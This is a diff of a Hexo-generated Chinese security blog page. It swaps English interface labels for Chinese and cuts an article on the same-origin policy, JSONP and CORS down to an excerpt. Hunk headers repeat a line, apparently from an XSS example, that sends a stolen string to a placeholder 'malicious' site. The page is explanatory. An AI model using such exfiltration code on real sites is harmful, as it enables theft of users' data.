@@ -140,13 +140,13 @@
                 <div class="tips-box hide">
                     <div class="tips-arrow"></div>
                     <ul class="tips-inner">
-                        <li>Menu</li>
-                        <li>Tags</li>
+                        <li>菜单</li>
+                        <li>标签</li>
                         
-                        <li>Friends</li>
+                        <li>友情链接</li>
                         
                         
-                        <li>About Me</li>
+                        <li>关于我</li>
                         
                     </ul>
                 </div>
@@ -270,7 +270,7 @@
             </nav>
         </header>                
     </div>
-    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
       <div class="body-wrap">
   
@@ -374,7 +374,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="总概述"><a href="#总概述" class="headerlink" title="总概述"></a>总概述</h2><h3 id="1-浏览器同源策略"><a href="#1-浏览器同源策略" class="headerlink" title="1.浏览器同源策略"></a>1.浏览器同源策略</h3><pre><code>互联网的发展催生了跨域访问的需求，各种跨域方法和协议满足了需求但也增加了各种风险。
+              <h2 id="总概述"><a href="#总概述" class="headerlink" title="总概述"></a>总概述</h2><h3 id="1-浏览器同源策略"><a href="#1-浏览器同源策略" class="headerlink" title="1.浏览器同源策略"></a>1.浏览器同源策略</h3><pre><code>互联网的发展催生了跨域访问的需求，各种跨域方法和协议满足了需求但也增加了各种风险。
 尤其是XSS和CSRF等攻击的盛行也得益于此。
 </code></pre><p>同源策略（Same origin policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。</p>
 <p>跨域问题是由于浏览器的同源策略所引起的，浏览器同源策略在web应用中非常重要，没有它web的世界会一团糟。</p>
@@ -384,59 +384,7 @@
 </blockquote>
 </li>
 </ul>
-<p>在浏览器中，&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;、&lt;link&gt;等标签都可以加载跨域资源，而不受同源限制，但浏览器限制了JavaScript的权限使其不能读、写加载的内容。</p>
-<p>另外同源策略只对网页的HTML文档做了限制，对加载的其他静态资源如javascript、css、图片等仍然认为属于同源。</p>
-<p>URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。</p>
-<p>比较容易忽略的一点就是协议不同也会引发同源策略，http和https是不同源的。</p>
-<p>浏览器的同源策略就是，从一个源上加载的脚本不允许访问不同源的文档，这个有点抽象，具体体现在下面两个方面。</p>
-<ul>
-<li>标签的同源策略</li>
-</ul>
-<p>我们知道通过标签加载资源是不会受到限制的，比如&lt;script&gt;加载cdn加速的js资源，&lt;img&gt;加载不同域的图片等，&lt;iframe&gt;加载其他域的html。</p>
-<p>似乎浏览器对于标签加载资源没有作同源策略。实际上标签的同源策略体现在浏览器限制了JavaScript的权限使其不能读、写加载的html文档。</p>
-<p>注意仅仅指的是html文档，具体而言指的是iframe加载的html文档，js无法访问其document。 而js，img等仍然认为是同源，不受访问限制。</p>
-<ul>
-<li>ajax同源策略</li>
-</ul>
-<p>浏览器发出的xmlhttprequest也存在同源的问题，不同源的访问会被限制，接下来将介绍这部分内容</p>
-<h3 id="2-Ajax跨域"><a href="#2-Ajax跨域" class="headerlink" title="2.Ajax跨域"></a>2.Ajax跨域</h3><p>同源策略是web安全上的考虑，但是实际的工作中经常会碰到需要跨域的情况。主流的跨域方式有</p>
-<ol>
-<li>JSONP方式</li>
-<li>CORS跨域同源<h3 id="3-iframe跨域"><a href="#3-iframe跨域" class="headerlink" title="3.iframe跨域"></a>3.iframe跨域</h3></li>
-<li>html5 postMessage方式</li>
-<li>window.name</li>
-</ol>
-<hr>
-<h2 id="细说："><a href="#细说：" class="headerlink" title="细说："></a>细说：</h2><h3 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h3><p>Ajax (XMLHttpRequest)请求受到同源策略的限制。</p>
-<p>Ajax通过XMLHttpRequest能够与远程的服务器进行信息交互，另外XMLHttpRequest是一个纯粹的Javascript对象，这样的交互过程，是在后台进行的，用户不易察觉。</p>
-<p>因此，XMLHTTP实际上已经突破了原有的Javascript的安全限制。</p>
-<ul>
-<li>举个例子：</li>
-</ul>
-<blockquote>
-<p>假设某网站引用了其它站点的javascript，这个站点被compromise并在javascript中加入获取用户输入并通过ajax提交给其他站点，这样就可以源源不断收集信息。</p>
-<p>或者某网站因为存在漏洞导致XSS注入了javascript脚本，这个脚本就可以通过ajax获取用户信息并通过ajax提交给其他站点，这样就可以源源不断收集信息。</p>
-</blockquote>
-<p>如果我们又想利用XMLHTTP的无刷新异步交互能力，又不愿意公然突破Javascript的安全策略，可以选择的方案就是给XMLHTTP加上严格的同源限制。</p>
-<p>这样的安全策略，很类似于Applet的安全策略。IFrame的限制还仅仅是不能访问跨域HTMLDOM中的数据，而XMLHTTP则根本上限制了跨域请求的提交。（实际上下面提到了CORS已经放宽了限制）</p>
-<p>随着Ajax技术和网络服务的发展，对跨域的要求也越来越强烈。下面介绍Ajax的跨域技术。</p>
-<h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>JSONP技术实际和Ajax没有关系。我们知道&lt;script&gt;标签可以加载跨域的javascript脚本，并且被加载的脚本和当前文档属于同一个域。因此在文档中可以调用/访问脚本中的数据和函数。如果javascript脚本中的数据是动态生成的，那么只要在文档中动态创建&lt;script&gt;标签就可以实现和服务端的数据交互。</p>
-<p>JSONP就是利用&lt;script&gt;标签的跨域能力实现跨域数据的访问，请求动态生成的JavaScript脚本同时带一个callback函数名作为参数。其中callback函数本地文档的JavaScript函数，服务器端动态生成的脚本会产生数据，并在代码中以产生的数据为参数调用callback函数。当这段脚本加载到本地文档时，callback函数就被调用。</p>
-<h4 id="CORS-Cross-origin-resource-sharing"><a href="#CORS-Cross-origin-resource-sharing" class="headerlink" title="CORS (Cross origin resource sharing)"></a>CORS (Cross origin resource sharing)</h4><pre><code>CORS协议提升了Ajax的跨域能力，但也增加了风险。一旦网站被注入脚本或XSS攻击，
-将非常方便的获取用户信息并悄悄传递出去。 
-</code></pre><p>通过在HTTP Header中加入扩展字段，服务器在相应网页头部加入字段表示允许访问的domain和HTTP method，客户端检查自己的域是否在允许列表中，决定是否处理响应。</p>
-<p>实现的基础是JavaScript不能够操作HTTP Header。某些浏览器插件实际上是具有这个能力的。</p>
-<p>服务器端在HTTP的响应头中加入（页面层次的控制模式）：</p>
-<blockquote>
-<p>Access-Control-Allow-Origin: example.com<br>   Access-Control-Request-Method: GET, POST<br>   Access-Control-Allow-Headers: Content-Type, Authorization, Accept, Range, Origin<br>   Access-Control-Expose-Headers: Content-Range<br>   Access-Control-Max-Age: 3600 </p>
-</blockquote>
-<p>多个域名之间用逗号分隔，表示对所示域名提供跨域访问权限。</p>
-<p>客户端可以有两种行为：</p>
-<ol>
-<li>发送OPTIONS请求，请求Access-Control信息。如果自己的域名在允许的访问列表中，则发送真正的请求，否则放弃请求发送。</li>
-<li>直接发送请求，然后检查response的Access-Control信息，如果自己的域名在允许的访问列表中，则读取response body，否则放弃。</li>
-</ol>
-
+          
       
     </div>
     
@@ -453,6 +401,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/同源/">同源</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/跨域/">跨域</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a href="/2017/03/24/cross-domain/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -1099,14 +1051,14 @@ document.location=&quot;http://your-malicious-site.com?stolen=&quot;+ str;
                 2016-2017 琪艺安
             </div>
             <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
             </div>
         </div>
         
             <div class="visit">
                 
                     <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                         </span>
                     </span>
                 
@@ -1115,7 +1067,7 @@ document.location=&quot;http://your-malicious-site.com?stolen=&quot;+ str;
                 
                 
                     <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                         </span>
                     </span>
                 
@@ -1148,9 +1100,9 @@ document.location=&quot;http://your-malicious-site.com?stolen=&quot;+ str;
 
 
 <div class="scroll" id="scroll">
-    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
 </div>
 <script>
     // Open in New Window
